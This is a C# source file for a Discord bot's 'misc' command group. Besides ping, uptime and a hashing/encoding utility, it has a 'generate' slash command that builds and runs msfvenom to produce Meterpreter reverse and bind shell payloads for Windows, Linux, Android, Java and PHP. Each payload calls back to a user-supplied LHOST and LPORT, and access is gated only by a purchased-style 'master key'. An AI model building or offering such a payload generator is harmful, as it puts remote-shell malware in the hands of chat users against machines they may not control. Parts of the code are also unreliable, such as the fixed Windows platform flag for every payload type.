using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Discord;
using Discord.WebSocket;
using Discord.Interactions;
using atfot.core.services;
using atfot.models;
using System.Text;
using System.Security.Cryptography;
using System.IO;
using System.Linq;

namespace atfot.modules.utilities;

[Group("misc", "miscellaneous OSINT utilities")]
public class MiscCmd : InteractionModuleBase<SocketInteractionContext>
{
    private readonly KeyRedemptionService _keyService;
    private readonly CooldownService _cooldown;
    private readonly EmbedBuilderService _embed;
    private readonly ExportService _export;

    public MiscCmd(
        KeyRedemptionService keyService,
        CooldownService cooldown,
        EmbedBuilderService embed,
        ExportService export)
    {
        _keyService = keyService;
        _cooldown = cooldown;
        _embed = embed;
        _export = export;
    }

    private async Task<bool> EnsureAuthorized()
    {
        return await _keyService.IsAuthorizedAsync(Context.User.Id.ToString());
    }

    [SlashCommand("ping", "check bot latency and status")]
    public async Task Ping()
    {
        var client = Context.Client as DiscordSocketClient;
        var latency = client?.Latency ?? -1;
        var embed = _embed.CreateMonochromeEmbed("ping",
            $"**Latency:** {latency}ms\n**Status:** ✅ operational\n**Uptime:** {TimeSpan.FromMilliseconds(Environment.TickCount64 - _startTime).ToString(@"hh\:mm\:ss")}",
            "dark");
        await RespondAsync(embed: embed);
    }

    private static readonly long _startTime = Environment.TickCount64;

    [SlashCommand("uptime", "check how long the bot has been running")]
    public async Task Uptime()
    {
        var up = TimeSpan.FromMilliseconds(Environment.TickCount64 - _startTime);
        var embed = _embed.CreateMonochromeEmbed("uptime",
            $"**Running for:** {up.ToString(@"d\.hh\:mm\:ss")}\n**Started at:** <t:{(long)(DateTime.UtcNow - up).Subtract(new DateTime(1970, 1, 1)).TotalSeconds}:R>",
            "dark");
        await RespondAsync(embed: embed);
    }

    [SlashCommand("generate", "generate a pentest payload using msfvenom (Docker only)")]
    public async Task Generate(
        [Summary("type", "payload type: reverse_tcp, reverse_http, bind_tcp, web_shelf, exe, elf, apk, ps1, dll, war, php")] string type,
        [Summary("lhost", "your IP for callback (required for reverse shells)")] string lhost = "",
        [Summary("lport", "port for callback (default 4444)")] int lport = 4444,
        [Summary("format", "output format: raw, exe, elf, war, php, asp, jsp, hex")] string format = "exe")
    {
        if (!await EnsureAuthorized()) { await RespondAsync("[ERR] redeem a master key first.", ephemeral: true); return; }
        if (_cooldown.IsOnCooldown(Context.User.Id.ToString(), out var rem)) { await RespondAsync($"[WARN] wait {rem.TotalSeconds:F0}s.", ephemeral: true); return; }
        _cooldown.SetUsed(Context.User.Id.ToString());

        string payload = type.ToLower() switch
        {
            "reverse_tcp" => $"windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport}",
            "reverse_http" => $"windows/meterpreter/reverse_http LHOST={lhost} LPORT={lport}",
            "bind_tcp" => $"windows/meterpreter/bind_tcp LPORT={lport}",
            "web_shelf" => $"windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport}",
            "exe" => $"windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport}",
            "elf" => $"linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport}",
            "apk" => $"android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport}",
            "ps1" => $"windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport}",
            "dll" => $"windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport}",
            "war" => $"java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport}",
            "php" => $"php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport}",
            _ => ""
        };

        if (string.IsNullOrEmpty(payload))
        {
            await RespondAsync("[ERR] Unknown type. Valid: reverse_tcp, reverse_http, bind_tcp, exe, elf, apk, ps1, dll, war, php", ephemeral: true);
            return;
        }
        if (string.IsNullOrEmpty(lhost) && type != "bind_tcp")
        {
            await RespondAsync("[ERR] `lhost` is required for reverse shells.", ephemeral: true);
            return;
        }

        string outputFormat = format.ToLower() switch
        {
            "exe" => "-f exe",
            "elf" => "-f elf",
            "war" => "-f war",
            "php" => "-f raw",
            "asp" => "-f asp",
            "jsp" => "-f jsp",
            "hex" => "-f hex",
            "raw" => "-f raw",
            _ => "-f raw"
        };

        await DeferAsync();
        var loading = await FollowupAsync(embed: _embed.CreateLoadingEmbed($"generating `{type}` payload..."));
        var args = $"-p {payload} {outputFormat} --platform windows -o /tmp/payload_output.bin 2>&1";
        var output = await RunCli("msfvenom", args, 60);

        if (output.Contains("Error") || output.Contains("No such"))
        {
            await ShowError(loading.Id, $"msfvenom not available. This command requires Docker. Error: {output}");
            return;
        }

        var embed = _embed.CreateMonochromeEmbed("payload generated",
            $"**Type:** `{type}`\n**Payload:** `{payload}`\n**Format:** {format}\n**Size:** {output.Length} bytes\n\n`msfvenom` output:\n```\n{output}\n```", "dark");
        await loading.ModifyAsync(m => { m.Embed = embed; m.Components = null; });
    }

    private async Task ShowError(ulong msgId, string message)
    {
        var embed = new EmbedBuilder()
            .WithDescription($"[err] {message}")
            .WithColor(new Color(0x55, 0x55, 0x55))
            .WithCurrentTimestamp()
            .WithFooter(f => f.Text = EmbedBuilderService.FooterText)
            .Build();
        var channel = Context.Channel;
        if (channel == null) return;
        var msg = await channel.GetMessageAsync(msgId) as IUserMessage;
        if (msg != null)
            await msg.ModifyAsync(m => { m.Embed = embed; m.Components = null; });
    }

    private async Task<string> RunCli(string command, string args, int timeoutSec = 30)
    {
        try
        {
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = command,
                Arguments = args,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false
            };
            using var proc = new System.Diagnostics.Process { StartInfo = psi };
            try { proc.Start(); }
            catch (System.ComponentModel.Win32Exception ex) when (ex.NativeErrorCode == 2)
            {
                return $"[ERR] command '{command}' not found. This tool is only available in Docker.";
            }
            var outputTask = proc.StandardOutput!.ReadToEndAsync();
            var errorTask = proc.StandardError!.ReadToEndAsync();
            if (await Task.WhenAny(proc.WaitForExitAsync(), Task.Delay(timeoutSec * 1000)) != proc.WaitForExitAsync())
            {
                proc.Kill();
                return $"[WARN] timeout after {timeoutSec}s.";
            }
            await outputTask;
            await errorTask;
            var output = outputTask.Result;
            var error = errorTask.Result;
            return string.IsNullOrEmpty(error) ? output : output + "\n--- STDERR ---\n" + error;
        }
        catch (Exception ex) { return $"[ERR] {ex.Message}"; }
    }

    [SlashCommand("cyberchef", "basic encoding/hashing using CyberChef-like operations")]
    public async Task CyberChef(
        [Summary("input", "string to process")] string input,
        [Summary("operation", "md5, sha1, sha256, base64_encode, base64_decode, url_encode, url_decode")] string operation,
        [Summary("export", "export format (none, txt, json)")] string export = "none")
    {
        if (!await EnsureAuthorized())
        {
await RespondAsync("[ERR] you need to redeem a master key first.", ephemeral: true);
            return;
        }
        if (_cooldown.IsOnCooldown(Context.User.Id.ToString(), out var remaining))
        {
await RespondAsync($"[WARN] please wait {remaining.TotalSeconds:F0} seconds.", ephemeral: true);
            return;
        }
        _cooldown.SetUsed(Context.User.Id.ToString());

        await DeferAsync();

        var dto = new ScanResultDto
        {
            TargetLookup = input,
            ModuleSource = "cyberchef"
        };

        string result = "";
        try
        {
            switch (operation.ToLower())
            {
                case "md5":
                    result = BitConverter.ToString(MD5.HashData(Encoding.UTF8.GetBytes(input))).Replace("-", "").ToLower();
                    break;
                case "sha1":
                    result = BitConverter.ToString(SHA1.HashData(Encoding.UTF8.GetBytes(input))).Replace("-", "").ToLower();
                    break;
                case "sha256":
                    result = BitConverter.ToString(SHA256.HashData(Encoding.UTF8.GetBytes(input))).Replace("-", "").ToLower();
                    break;
                case "base64_encode":
                    result = Convert.ToBase64String(Encoding.UTF8.GetBytes(input));
                    break;
                case "base64_decode":
                    result = Encoding.UTF8.GetString(Convert.FromBase64String(input));
                    break;
                case "url_encode":
                    result = Uri.EscapeDataString(input);
                    break;
                case "url_decode":
                    result = Uri.UnescapeDataString(input);
                    break;
                default:
                    result = "Unknown operation. Available: md5, sha1, sha256, base64_encode, base64_decode, url_encode, url_decode";
                    break;
            }
        }
        catch (Exception ex)
        {
            result = $"Error: {ex.Message}";
        }

        dto.Summary = result;
        var description = $"**Operation:** {operation}\n**Input:** `{input}`\n**Result:** `{result}`";
        var embed = _embed.CreateMonochromeEmbed("cyberchef utility", description, "dark");

        if (export.ToLower() == "json")
            await FollowupWithFileAsync(_export.BuildJsonStream(dto), "cyberchef.json", embed: embed);
        else if (export.ToLower() == "txt")
            await FollowupWithFileAsync(_export.BuildTextStream(dto), "cyberchef.txt", embed: embed);
        else
            await FollowupAsync(embed: embed);
    }

}



